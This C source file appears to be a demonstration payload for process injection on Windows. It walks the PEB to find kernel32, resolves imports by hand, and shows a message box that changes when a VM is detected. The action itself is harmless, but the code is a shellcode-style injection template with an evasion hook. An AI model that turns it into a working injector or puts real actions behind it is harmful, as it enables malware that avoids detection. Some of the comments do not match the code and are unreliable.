#include <windows.h>
#include <winnt.h>
#include <intrin.h>

// Type definitions
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef int (WINAPI *pMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
typedef void (WINAPI *pSleep)(DWORD);
typedef void (WINAPI *pOutputDebugStringA)(LPCSTR);

// Use MSVC intrinsic for TEB (only works on x64)
#define NtCurrentPeb() ((PPEB)__readgsqword(0x60))

#pragma section("inject", read, execute)

// Hardcoded strings
__declspec(allocate("inject")) wchar_t kernel32_name[] = L"KERNEL32.DLL";
__declspec(allocate("inject")) const char user32_name[] = "user32.dll";
__declspec(allocate("inject")) const char msgboxa_name[] = "MessageBoxA";
__declspec(allocate("inject")) const char loadlib_name[] = "LoadLibraryA";
__declspec(allocate("inject")) const char getproc_name[] = "GetProcAddress";
__declspec(allocate("inject")) const char msg_title[] = "Injected!";
__declspec(allocate("inject")) const char msg_text[] = "Hello from payload";
__declspec(allocate("inject")) const char vm_msg_text[] = "Running in a VM environment!";

/**
 * Compares two strings case-insensitively.
 * 
 * @param str1 First string to compare.
 * @param str2 Second string to compare.
 * 
 * @return 0 if the strings are equal, a negative value if str1 < str2, or a positive value if str1 > str2.
 */
__declspec(code_seg("inject"))
int _lstrcmpA(const char* str1, const char* str2) {
    while (*str1 && *str2) {
        if (*str1 != *str2) {
            return *str1 - *str2;
        }
        str1++;
        str2++;
    }
    return *str1 - *str2;
}

/**
 * Compares two wide-character strings case-insensitively.
 * 
 * @param s1 First string to compare.
 * @param s2 Second string to compare.
 * 
 * @return 0 if the strings are equal, a negative value if s1 < s2, or a positive value if s1 > s2.
 */
__declspec(code_seg("inject"))
int _wcsicmp(const wchar_t* s1, const wchar_t* s2) {
    while (*s1 && *s2) {
        wchar_t c1 = *s1++;
        wchar_t c2 = *s2++;

        // Convert to lowercase if uppercase A-Z
        if (c1 >= L'A' && c1 <= L'Z') c1 += 32;
        if (c2 >= L'A' && c2 <= L'Z') c2 += 32;

        if (c1 != c2)
            return c1 - c2;
    }
    return *s1 - *s2;
}

/**
 * Retrieves the base address of KERNEL32.DLL.
 * 
 * This function traverses the PEB's loader data to find the module.
 * It compares the module names case-insensitively to find "KERNEL32.DLL".
 * 
 * @return The base address of KERNEL32.DLL, or NULL if not found.
 */
__declspec(code_seg("inject"))
HMODULE get_kernel32_base() {
    PPEB peb = NtCurrentPeb();
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        PUNICODE_STRING name = &entry->BaseDllName;

        // pre-check for valid name buffer and length
        if (!name || !name->Buffer || name->Length != 24) {
            curr = curr->Flink;
            continue;
        }

        // Check if the name matches "KERNEL32.DLL" case-insensitively
        if (_wcsicmp(name->Buffer, kernel32_name) == 0) {
            return (HMODULE)entry->DllBase;
        }

        curr = curr->Flink;
    }
    return NULL;
}

/**
 * Resolves an export function from a module by its name.
 * 
 * @param module The module handle to search in.
 * @param name The name of the function to resolve.
 * 
 * @return The address of the function, or NULL if not found.
 */
__declspec(code_seg("inject"))
FARPROC resolve_export(HMODULE module, const char* name) {
    BYTE* base = (BYTE*)module;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(base + dir.VirtualAddress);

    DWORD* name_rvas = (DWORD*)(base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* func_name = (const char*)(base + name_rvas[i]);

        if (_lstrcmpA(func_name, name) == 0) {
            WORD ordinal = ordinals[i];
            return (FARPROC)(base + functions[ordinal]);
        }
    }
    return NULL;
}

/**
 * Main payload function that will be executed.
 * 
 * This function retrieves the base address of KERNEL32.DLL, resolves necessary functions,
 * loads user32.dll, and shows a message box.
 * 
 * @param unused An unused parameter to demonstrate argument count.
 * 
 * @return A value based on the argument count.
 */
__declspec(code_seg("inject"))
void main_payload(int is_vm) {

    HMODULE kernel32 = get_kernel32_base();

    pGetProcAddress GetProcAddress_ = (pGetProcAddress)resolve_export(kernel32, getproc_name);

    // Resolve LoadLibraryA and GetProcAddress manually
    pLoadLibraryA LoadLibraryA_ = (pLoadLibraryA)resolve_export(kernel32, loadlib_name);

    // Load user32.dll
    HMODULE user32 = LoadLibraryA_(user32_name);

    // Resolve MessageBoxA
    pMessageBoxA MessageBoxA_ = (pMessageBoxA)GetProcAddress_(user32, msgboxa_name);

    // Show message box
    if (is_vm) {
        // Take appropriate action for VM detection
        MessageBoxA_(NULL, vm_msg_text, msg_title, MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBoxA_(NULL, msg_text, msg_title, MB_OK | MB_ICONINFORMATION);
    }
}
